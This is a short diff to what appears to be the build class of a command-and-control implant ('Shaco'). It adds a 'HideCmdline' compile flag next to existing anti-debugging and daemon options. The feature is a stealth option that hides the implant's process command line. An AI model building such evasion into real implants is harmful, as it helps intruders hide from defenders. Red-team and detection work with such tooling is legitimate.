@@ -248,7 +248,8 @@ class Shaco(AgentType):
         'Sleep': '5',
         'MaxTimeout': '0',
         'AntiDebug': True,
-        'Daemon': True
+        'Daemon': True,
+        'HideCmdline': True
     }
 
     Commands = [
@@ -262,7 +263,6 @@ class Shaco(AgentType):
         CommandSleep(),
         CommandJitter()
     ]
-
 
     def generate(self, config:dict) -> None:
         print(config)
@@ -325,6 +325,9 @@ class Shaco(AgentType):
 
             if config['Config']['Daemon']:
                 flags += '-DDaemon=ON '
+
+            if config['Config']['HideCmdline']:
+                flags += '-DHIDE_CMDLINE=ON '
 
             if config['Options']['Format'] == 'Linux Shared Library':
                 self.builder_send_message(cliid, MessageType.Info, "Compiling Shared Library")
